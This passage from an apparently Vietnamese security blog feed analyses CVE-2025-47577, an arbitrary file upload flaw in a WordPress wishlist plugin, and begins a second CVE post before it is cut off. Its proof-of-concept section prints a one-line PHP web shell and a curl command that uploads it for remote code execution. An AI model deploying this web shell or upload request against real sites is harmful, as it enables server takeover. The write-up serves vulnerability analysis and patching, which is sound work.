&amp;#39;application/oxps&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xps&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-xpsdocument&amp;#39;,&#xA;&#x9;&#x9;&#x9;// OpenOffice formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;odt&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.text&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odp&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.presentation&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ods&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.spreadsheet&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odg&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.graphics&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odc&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.chart&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odb&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.database&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odf&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.formula&amp;#39;,&#xA;&#x9;&#x9;&#x9;// WordPerfect formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;wp|wpd&amp;#39;                       =&amp;gt; &amp;#39;application/wordperfect&amp;#39;,&#xA;&#x9;&#x9;&#x9;// iWork formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;key&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.apple.keynote&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;numbers&amp;#39;                      =&amp;gt; &amp;#39;application/vnd.apple.numbers&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pages&amp;#39;                        =&amp;gt; &amp;#39;application/vnd.apple.pages&amp;#39;,&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ ƒê√£ t√¨m ra ƒë√°p √°n cho c√¢u h·ªèi th·ª© 2&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function tinvwl_meta_wc_fields_factory( $meta, $post, $files ) {&#xA;&#x9;if ( function_exists( &amp;#39;wcff&amp;#39; ) ) {&#xA;&#x9;&#x9;foreach ( $files as $name =&amp;gt; $file ) {&#xA;&#x9;&#x9;&#x9;if ( array_key_exists( $name, $meta ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$upload = tinvwl_upload_file_wc_fields_factory( $file );&#xA;&#x9;&#x9;&#x9;&#x9;if ( empty( $upload[&amp;#39;error&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $upload[&amp;#39;file&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$file[&amp;#39;tmp_name&amp;#39;] = $upload[&amp;#39;file&amp;#39;];&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$meta[ $name ]    = json_encode( array_merge( $upload, $file ) );&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return $meta;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ ch·∫°y n·∫øu plugin &lt;strong&gt;WC Fields Factory (wcff)&lt;/strong&gt; ƒëang ƒë∆∞·ª£c k√≠ch ho·∫°t - v√¨ plugin n√†y ƒë·ªãnh nghƒ©a h√†m &lt;code&gt;wcff()&lt;/code&gt;, khi t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;function wcff(&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a c√°c plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/wcff.png&#34; title=&#34;N∆°i wcff() ƒë∆∞·ª£c t·∫°o&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/wcff.png&#34; data-sub-html=&#34;&lt;h2&gt;wcff&lt;/h2&gt;&lt;p&gt;N∆°i wcff() ƒë∆∞·ª£c t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/wcff.png&#39; alt=&#34;wcff&#34; height=&#34;407&#34; width=&#34;1220&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N∆°i wcff() ƒë∆∞·ª£c t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta th·∫•y ƒë∆∞·ª£c n∆°i h√†m &lt;code&gt;wcff()&lt;/code&gt; ƒë∆∞·ª£c t·∫°o l√† plugin &lt;strong&gt;WC Fields Factory (wcff)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( array_key_exists( $name, $meta ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ x·ª≠ l√Ω n·∫øu t√™n file (&lt;code&gt;$name&lt;/code&gt;) tr√πng v·ªõi m·ªôt key trong &lt;code&gt;$meta&lt;/code&gt; (t·ª©c l√† tr∆∞·ªùng form h·ª£p l·ªá).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload = tinvwl_upload_file_wc_fields_factory( $file );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;G·ªçi h√†m &lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; ƒë·ªÉ upload file l√™n server&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho filter&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter( &amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, &amp;#39;tinvwl_meta_wc_fields_factory&amp;#39;, 10, 3 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√≥ nghƒ©a l√†, n·∫øu trong m√£ ngu·ªìn &lt;code&gt;apply_filters( &#39;tinvwl_addtowishlist_prepare_form&#39;,...)&lt;/code&gt; th√¨ &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;tinvwl_addtowishlist_prepare_form&lt;/code&gt; ƒë∆∞·ª£c apply trong h√†m &lt;code&gt;add_to_wishlist()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add_to_wishlist() {&#xA;    if ( is_null( filter_input( INPUT_POST, &amp;#39;tinv_wishlist_id&amp;#39; ) ) ) {&#xA;        return false;&#xA;    } else {&#xA;        remove_action( &amp;#39;init&amp;#39;, &amp;#39;woocommerce_add_to_cart_action&amp;#39; );&#xA;        remove_action( &amp;#39;wp_loaded&amp;#39;, &amp;#39;WC_Form_Handler::add_to_cart_action&amp;#39;, 20 );&#xA;    }&#xA;    ob_start();&#xA;    $post = filter_input_array( INPUT_POST, array(&#xA;        &amp;#39;tinv_wishlist_id&amp;#39;   =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;tinv_wishlist_name&amp;#39; =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;product_id&amp;#39;         =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;product_variation&amp;#39;  =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;product_type&amp;#39;       =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;product_action&amp;#39;     =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;redirect&amp;#39;           =&amp;gt; FILTER_SANITIZE_URL,&#xA;    ) );&#xA;&#xA;    $post[&amp;#39;original_product_id&amp;#39;] = $post[&amp;#39;product_id&amp;#39;];&#xA;&#xA;    $wlp      = null;&#xA;    $wishlist = null;&#xA;    $data     = array( &amp;#39;msg&amp;#39; =&amp;gt; array() );&#xA;    ...&#xA;&#xA;    $status = true;&#xA;    if ( empty( $post[&amp;#39;product_id&amp;#39;] ) || apply_filters( &amp;#39;tinvwl_addtowishlist_not_allowed&amp;#39;, false, $post ) ) {&#xA;        $status        = false;&#xA;        $data[&amp;#39;msg&amp;#39;][] = __( &amp;#39;Something went wrong&amp;#39;, &amp;#39;ti-woocommerce-wishlist&amp;#39; );&#xA;    } else {&#xA;        $post[&amp;#39;product_type&amp;#39;] = apply_filters( &amp;#39;tinvwl_addtowishlist_modify_type&amp;#39;, $post[&amp;#39;product_type&amp;#39;], $post );&#xA;        $post                 = apply_filters( &amp;#39;tinvwl_addtowishlist_prepare&amp;#39;, $post );&#xA;        $form                 = apply_filters( &amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, filter_input( INPUT_POST, &amp;#39;form&amp;#39;, FILTER_DEFAULT, FILTER_FORCE_ARRAY ), $_POST, $_FILES );&#xA;        ...&#xA;    } &#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán c·∫ßn ƒë·ªÉ logic apply ƒë∆∞·ª£c g·ªçi l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;POST method g·ªìm c√°c tham s·ªë &lt;code&gt;tinv_wishlist_id&lt;/code&gt; t·ªìn t·∫°i.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;product_id&lt;/code&gt; t·ªìn t·∫°i v√† filter &lt;code&gt;tinvwl_addtowishlist_not_allowed&lt;/code&gt; lu√¥n &lt;code&gt;false&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Filter &lt;code&gt;tinvwl_addtowishlist_not_allowed&lt;/code&gt; m·∫∑c ƒë·ªãnh s·∫Ω tr·∫£ v·ªÅ &lt;code&gt;false&lt;/code&gt; v√¨ khi search, t√¥i kh√¥ng th·∫•y v·ªã tr√≠ n√†o apply ƒë·ªÉ thay ƒë·ªïi gi√° tr·ªã c·ªßa n√≥.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/filter.png&#34; title=&#34;tinvwl_addtowishlist_not_allowed lu√¥n false&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;tinvwl_addtowishlist_not_allowed lu√¥n false&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/filter.png&#39; alt=&#34;Filter&#34; height=&#34;330&#34; width=&#34;1689&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;tinvwl_addtowishlist_not_allowed lu√¥n false&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;add_to_wishlist()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_loaded&amp;#39;, array( $this, &amp;#39;add_to_wishlist&amp;#39; ), 0 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c s·∫Ω g·ªçi &lt;code&gt;add_to_wishlist&lt;/code&gt; tr√™n m·ªói request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;  A[&amp;#34;HTTP POST (tinv_wishlist_id, product_id, form[...] &amp;#43; file)&amp;#34;] --&amp;gt; B[&amp;#34;wp_loaded ‚Üí add_to_wishlist()&amp;#34;]&#xA;  B --&amp;gt; C[&amp;#34;apply_filters(&amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, $_POST[&amp;#39;form&amp;#39;], $_POST, $_FILES)&amp;#34;]&#xA;  C --&amp;gt; D[&amp;#34;tinvwl_meta_wc_fields_factory($meta, $post, $files)&amp;#34;]&#xA;  D --&amp;gt; E[&amp;#34;foreach $files as $name =&amp;gt; $file&amp;#34;]&#xA;  E --&amp;gt; F[&amp;#34;if array_key_exists($name, $meta)&amp;#34;]&#xA;  F --&amp;gt; G[&amp;#34;tinvwl_upload_file_wc_fields_factory($file)&amp;#34;]&#xA;  G --&amp;gt; H[&amp;#34;wp_handle_upload($file, [&amp;#39;test_form&amp;#39;=&amp;gt;false, &amp;#39;test_type&amp;#39;=&amp;gt;false])&amp;#34;]&#xA;  H --&amp;gt; I[&amp;#34;_wp_handle_upload() ‚Äî MIME checks skipped&amp;#34;]&#xA;  I --&amp;gt; J[&amp;#34;File written to /wp-content/uploads ‚Üí possible RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o file &lt;code&gt;.php&lt;/code&gt; ch·ª©a web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;G·ª≠i POST request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost&amp;#34; -F &amp;#34;tinv_wishlist_id=1&amp;#34; -F &amp;#34;product_id=1&amp;#34; -F &amp;#34;form[image]=1&amp;#34; -F &amp;#34;image=@rce.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;RCE v·ªõi file upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/result.png&#39; alt=&#34;Result&#34; height=&#34;348&#34; width=&#34;559&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-47577&lt;/strong&gt; b·∫Øt ngu·ªìn t·ª´ vi·ªác &lt;strong&gt;v√¥ hi·ªáu h√≥a ki·ªÉm tra MIME type (&lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;)&lt;/strong&gt; trong h√†m &lt;code&gt;wp_handle_upload()&lt;/code&gt;, cho ph√©p k·∫ª t·∫•n c√¥ng t·∫£i l√™n b·∫•t k·ª≥ t·ªáp n√†o, bao g·ªìm &lt;strong&gt;m√£ PHP ƒë·ªôc h·∫°i&lt;/strong&gt;. Khi file ƒë∆∞·ª£c t·∫£i l√™n th∆∞ m·ª•c &lt;code&gt;/wp-content/uploads/&lt;/code&gt;, n√≥ c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p tr·ª±c ti·∫øp ƒë·ªÉ th·ª±c thi m√£ t·ª´ xa (RCE).&#xA;B·∫£n v√° 2.10.0 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch b·∫≠t l·∫°i ki·ªÉm tra MIME, ƒë·∫£m b·∫£o ch·ªâ nh·ªØng lo·∫°i file h·ª£p l·ªá trong danh s√°ch whitelist c·ªßa WordPress m·ªõi ƒë∆∞·ª£c ph√©p upload.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n duy tr√¨ &lt;strong&gt;ki·ªÉm tra MIME type&lt;/strong&gt; v√† &lt;strong&gt;ph·∫ßn m·ªü r·ªông file&lt;/strong&gt; khi x·ª≠ l√Ω upload.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n &lt;strong&gt;ghi ƒë√® c√°c c∆° ch·∫ø b·∫£o m·∫≠t m·∫∑c ƒë·ªãnh&lt;/strong&gt; c·ªßa WordPress nh∆∞ &lt;code&gt;test_type&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khi ph√¢n t√≠ch l·ªó h·ªïng, vi·ªác &lt;strong&gt;so s√°nh patch diff&lt;/strong&gt; gi√∫p nhanh ch√≥ng nh·∫≠n di·ªán nguy√™n nh√¢n g·ªëc (root cause).&lt;/li&gt;&#xA;&lt;li&gt;Nh√† ph√°t tri·ªÉn plugin c·∫ßn th∆∞·ªùng xuy√™n &lt;strong&gt;ki·ªÉm tra c√°c hook v√† filter li√™n quan ƒë·∫øn upload&lt;/strong&gt; ƒë·ªÉ tr√°nh r·ªßi ro RCE.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ti-woocommerce-wishlist/vulnerability/wordpress-ti-woocommerce-wishlist-2-9-2-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TI WooCommerce Wishlist Plugin &amp;lt;= 2.9.2 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10647 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/</link>
      <pubDate>Thu, 06 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Embed PDF for WPForms&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; b·ªã l·ªó h·ªïng cho ph√©p &lt;strong&gt;arbitrary file uploads&lt;/strong&gt; do thi·∫øu ki·ªÉm tra lo·∫°i file trong h√†m &lt;code&gt;ajax_handler_download_pdf_media&lt;/code&gt; ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;1.1.5&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn truy c·∫≠p t·ª´ m·ª©c 